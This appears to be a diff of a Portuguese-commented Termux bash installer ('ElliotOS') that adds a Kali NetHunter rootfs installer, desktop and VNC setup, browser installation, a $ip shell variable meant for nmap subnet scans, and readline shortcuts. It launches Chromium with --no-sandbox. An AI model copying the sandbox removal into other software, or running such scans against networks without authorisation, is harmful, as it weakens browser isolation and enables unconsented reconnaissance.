+    local available_desktops=(E17 GNOME i3 KDE LXDE MATE Xfce)
+    local -A xstartups=(
+        [e17]=enlightenment_start [gnome]=gnome-session [i3]=i3
+        [kde]=startplasma-x11 [lxde]=startlxde [mate]=mate-session [xfce]=startxfce4
+    )
+    choose -d7 -t "Select Desktop Environment" "${available_desktops[@]}"
+    selected_desktop=${available_desktops[$((${?} - 1))]}
+    msg -t "Installing ${selected_desktop} Desktop"
+    command -v termux-wake-lock &>>"${LOG_FILE}" && {
+        msg -tn "Acquiring Termux wake lock..."
+        termux-wake-lock &>>"${LOG_FILE}" \
+            && { cursor -u1; msg -ts "Termux wake lock held"; } \
+            || { cursor -u1; msg -te "Failed to acquire Termux wake lock"; }
+    }
+    msg -tn "Installing ${selected_desktop} packages in ${DISTRO_NAME}..."
+    trap 'buffer -h; echo; msg -fem2; exit 130' INT
+    buffer -s
+    local pkgs=(tigervnc-standalone-server dbus-x11 kali-desktop-"${selected_desktop,,}")
+    if buffer -i apt update && distro_exec apt update &&
+        buffer -i apt full-upgrade && distro_exec apt full-upgrade &&
+        buffer -i apt install -y "${pkgs[@]}" && distro_exec apt install -y "${pkgs[@]}"; then
+        buffer -h3; trap - INT; cursor -u1
+        msg -ts "${selected_desktop} packages installed in ${DISTRO_NAME}"
+        msg -tn "Creating xstartup program..."
+        local xstartup
+        xstartup=$(cat 2>>"${LOG_FILE}" <<-XEOF
+            #!/bin/bash
+            unset SESSION_MANAGER
+            unset DBUS_SESSION_BUS_ADDRESS
+            export XDG_RUNTIME_DIR=\${TMPDIR:-/tmp}/runtime-"\$(id -u)"
+            export SHELL=\${SHELL:-/bin/sh}
+            if [[ -r ~/.Xresources ]]; then xrdb ~/.Xresources; fi
+            exec ${xstartups["${selected_desktop,,}"]}
+XEOF
+        )
+        if {
+            mkdir -p "${ROOTFS_DIRECTORY}"/root/.vnc &&
+            echo "${xstartup}" > "${ROOTFS_DIRECTORY}"/root/.vnc/xstartup &&
+            chmod 744 "${ROOTFS_DIRECTORY}"/root/.vnc/xstartup &&
+            if [[ ${DEFAULT_LOGIN} != root ]]; then
+                mkdir -p "${ROOTFS_DIRECTORY}"/home/"${DEFAULT_LOGIN}"/.vnc &&
+                echo "${xstartup}" > "${ROOTFS_DIRECTORY}"/home/"${DEFAULT_LOGIN}"/.vnc/xstartup &&
+                chmod 744 "${ROOTFS_DIRECTORY}"/home/"${DEFAULT_LOGIN}"/.vnc/xstartup
+            fi
+        } 2>>"${LOG_FILE}"; then
+            cursor -u1; msg -ts "Xstartup program created"
+        else
+            cursor -u1; msg -te "Failed to create xstartup program"
+        fi
+    else
+        buffer -h5; trap - INT; cursor -u1
+        msg -te "Failed to install ${selected_desktop} packages in ${DISTRO_NAME}"
+        return 1
+    fi
+}
+
+set_up_browser() {
+    local available_browsers=("Chromium" "Firefox ESR" "Chromium & Firefox ESR")
+    choose -d2 -t "Select Browser" "${available_browsers[@]}"
+    local selected_browser=${available_browsers[$((${?} - 1))]}
+    local selected_browsers suffix
+    if [[ ${selected_browser} == "${available_browsers[-1]}" ]]; then
+        selected_browsers=("${available_browsers[@]:0:${#available_browsers[@]}-1}")
+        selected_browsers=("${selected_browsers[@]// /-}")
+        suffix=s
+    else
+        selected_browsers=("${selected_browser// /-}")
+        suffix=
+    fi
+    msg -tn "Installing ${selected_browser} Browser${suffix}..."
+    trap 'buffer -h; echo; msg -fem2; exit 130' INT
+    buffer -s
+    if buffer -i apt install -y "${selected_browsers[@],,}" && \
+       distro_exec apt install -y "${selected_browsers[@],,}"; then
+        if [[ ${selected_browsers[0]} == "${available_browsers[0]}" && \
+              -f "${ROOTFS_DIRECTORY}"/usr/share/applications/chromium.desktop ]]; then
+            sed -Ei 's/^(Exec=.*chromium).*(%U)$/\1 --no-sandbox \2/' \
+                "${ROOTFS_DIRECTORY}"/usr/share/applications/chromium.desktop
+        fi
+        buffer -h3; trap - INT; cursor -u1
+        msg -ts "${selected_browser} Browser${suffix} installed"
+    else
+        buffer -h5; trap - INT; cursor -u1
+        msg -te "Failed to install ${selected_browser} Browser${suffix}"
+    fi
+}
+
+# ElliotOS NetHunter Installer — by Mike Elliot
+DISTRO_NAME="Kali NetHunter"
+PROGRAM_NAME="ElliotOS NetHunter Installer"
+KERNEL_RELEASE=$(uname -r)
+VERSION_NAME=2026.1
+
+SHASUM_CMD=sha256sum
+TRUSTED_SHASUMS=$(cat <<-SEOF
+    b8098fc90ed74a553592f7019a1d88dfe3c65b16c60af487b0658860554dc5aa  kali-nethunter-rootfs-full-arm64.tar.xz
+    b15a4aba9fb1c6f7481d7b3d08cb77c9e9c993eb542475961d008bdc64767d64  kali-nethunter-rootfs-full-armhf.tar.xz
+    08f121b553d03476b82b6322365eb4f47f73f4edf8800dafa7462b061eb2d0fc  kali-nethunter-rootfs-minimal-arm64.tar.xz
+    1ff5a8313cca728cf3c967bd2c8b59c629e8d4b9f4b35bf62b9df9f0097c8c1d  kali-nethunter-rootfs-minimal-armhf.tar.xz
+    484af462afa5064512f420d8565a90c7923ac6288f35d37d37dff6aa44936a23  kali-nethunter-rootfs-nano-arm64.tar.xz
+    d0761b79c0b303401a1ac405db1b2b223b0e3e8d60ec647a6b391fd70c595fdf  kali-nethunter-rootfs-nano-armhf.tar.xz
+SEOF
+)
+
+ARCHIVE_STRIP_DIRS=1
+BASE_URL=https://kali.download/nethunter-images/kali-${VERSION_NAME}/rootfs
+TERMUX_FILES_DIR=/data/data/com.termux/files
+DISTRO_SHORTCUT=${TERMUX_FILES_DIR}/usr/bin/nh
+DISTRO_LAUNCHER=${TERMUX_FILES_DIR}/usr/bin/nethunter
+DEFAULT_ROOTFS_DIR=${TERMUX_FILES_DIR}/kali
+DEFAULT_LOGIN=kali
+
+distro_template="$(dirname "${0}")/termux-distro.sh"
+if [[ -f ${distro_template} ]]; then
+    source "${distro_template}" "${@}" || exit 1
+else
+    echo "Motor de instalação não encontrado. Execute ms -nh novamente para baixar."
+    exit 1
+fi
+NHEOF
+    chmod +x "$nh_script"
+    printf "  \033[1;32m✓\033[0m NetHunter installer instalado em ~/.xpm/nethunter/\n"
+}
+
 _setup_prompt() {
     if ! grep -qF "ElliotOS: prompt customizado" "$HOME/.bashrc" 2>/dev/null; then
         cat >> "$HOME/.bashrc" << 'PROMPTEOF'
@@ -100691,8 +102627,76 @@ PROMPTEOF
 }
 
 # ════════════════════════════════════════════════════════════════════════════
+# _setup_ip_var — variável $ip com o IP privado sempre pronta em todo shell
+# novo, pra usar direto em nmap/outras ferramentas sem digitar ifconfig toda
+# hora (ex: nmap -sV $ip/24). 3 níveis de detecção, do pedido pro que
+# sobrevive num Termux mínimo: ifconfig (net-tools, o método pedido) -> ip
+# addr (iproute2, quase sempre presente mesmo sem net-tools) -> getprop
+# (funciona sem pacote nenhum extra). wlan0 primeiro (Wi-Fi, cenário mais
+# comum de pentest no celular); sem isso, cai pro primeiro adaptador
+# não-loopback com IPv4 (hotspot/USB/eth). Idempotente: só injeta se ainda
+# não existir. Igual ao _setup_prompt, não dá source no .bashrc aqui — o
+# usuario ativa com "source ~/.bashrc" no final.
 # ════════════════════════════════════════════════════════════════════════════
-# _install_editor — ElliotOS Editor (editor C nativo)
+_setup_ip_var() {
+    # ifconfig é o método pedido — garante que existe, mas sem travar a
+    # instalação se o download falhar (só perde esse fallback específico,
+    # "ip addr"/getprop cobrem o resto).
+    command -v ifconfig >/dev/null 2>&1 || pkg install -y net-tools 2>/dev/null || true
+
+    if ! grep -qF "ElliotOS: variavel de IP privado" "$HOME/.bashrc" 2>/dev/null; then
+        cat >> "$HOME/.bashrc" << 'IPEOF'
+
+# ── ElliotOS: variavel de IP privado ($ip) ───────────────────────────────────
+_elliot_refresh_ip() {
+    local _v=""
+    if command -v ifconfig >/dev/null 2>&1; then
+        _v=$(ifconfig wlan0 2>/dev/null | grep -oE 'inet (addr:)?[0-9]+(\.[0-9]+){3}' | grep -oE '[0-9]+(\.[0-9]+){3}' | head -1)
+        [ -z "$_v" ] && _v=$(ifconfig 2>/dev/null | grep -oE 'inet (addr:)?[0-9]+(\.[0-9]+){3}' | grep -oE '[0-9]+(\.[0-9]+){3}' | grep -v '^127\.' | head -1)
+    fi
+    if [ -z "$_v" ] && command -v ip >/dev/null 2>&1; then
+        _v=$(ip -4 addr show wlan0 2>/dev/null | grep -oE 'inet [0-9]+(\.[0-9]+){3}' | grep -oE '[0-9]+(\.[0-9]+){3}' | head -1)
+        [ -z "$_v" ] && _v=$(ip -4 addr show 2>/dev/null | grep -oE 'inet [0-9]+(\.[0-9]+){3}' | grep -oE '[0-9]+(\.[0-9]+){3}' | grep -v '^127\.' | head -1)
+    fi
+    if [ -z "$_v" ] && command -v getprop >/dev/null 2>&1; then
+        _v=$(getprop dhcp.wlan0.ipaddress 2>/dev/null)
+    fi
+    if [ -n "$_v" ]; then
+        export ip="$_v"
+    else
+        unset ip
+        printf '\033[1;33m[!] nao consegui detectar o IP privado (wifi desconectado?)\033[0m\n' >&2
+    fi
+}
+_elliot_refresh_ip
+alias ip-refresh='_elliot_refresh_ip'
+# ────────────────────────────────────────────────────────────────────────────
+IPEOF
+        _ok "Variável \$ip (IP privado automático) adicionada ao ~/.bashrc"
+    else
+        _ok "Variável \$ip já presente no ~/.bashrc — pulando"
+    fi
+}
+
+# ════════════════════════════════════════════════════════════════════════════
+# _setup_inputrc — Atalhos de teclado readline no ~/.inputrc
+# Idempotente: só escreve se o bloco ElliotOS ainda não existir.
+# ════════════════════════════════════════════════════════════════════════════
+_setup_inputrc() {
+    if ! grep -qF "# ElliotOS: readline" "$HOME/.inputrc" 2>/dev/null; then
+        cat >> "$HOME/.inputrc" << 'INPUTRC_EOF'
+
+# ── ElliotOS: readline ───────────────────────────────────────────────────────
+set completion-ignore-case on
+
+"\C-l": "clear\n"
+# ─────────────────────────────────────────────────────────────────────────────
+INPUTRC_EOF
+        _ok "Atalhos readline adicionados ao ~/.inputrc"
+    else
+        _ok "Atalhos readline já presentes no ~/.inputrc — pulando"
+    fi
+}
 # Compila editor.c → $_TPFX/bin/ee
 # ════════════════════════════════════════════════════════════════════════════
 _install_editor() {
@@ -105386,8 +107390,10 @@ _install_gui() {
     printf "        3. Rodar: \033[1melliot-gui\033[0m no terminal\n\n"
 
     # ── 3. Instala ElliotOS base ─────────────────────────────────────────
-    _step "🔧" "Instalando ElliotOS base..."
-    install_elliotos
+    if [ "${INSTALL_UPDATE:-0}" != "1" ]; then
+        _step "🔧" "Instalando ElliotOS base..."
+        install_elliotos
+    fi
 
     # ── 4. Instala dependências de GUI (XFCE4 mínimo) ───────────────────
     _step "🖥️" "Instalando ambiente gráfico XFCE4 (leve)..."
@@ -106492,9 +108498,7 @@ case "${1:-}" in
             install_elliotos
             # Sobrescreve binários GUI se já estiverem instalados
             if [ -f "${PREFIX:-/data/data/com.termux/files/usr}/bin/elliot-gui" ]; then
-                _TPFX="${PREFIX:-/data/data/com.termux/files/usr}"
                 _step "🔄" "Atualizando binários GUI (elliot-gui, rungui)..."
-                # Chama _install_gui mas apenas a parte dos binários
                 INSTALL_UPDATE=1 _install_gui
             fi
         fi
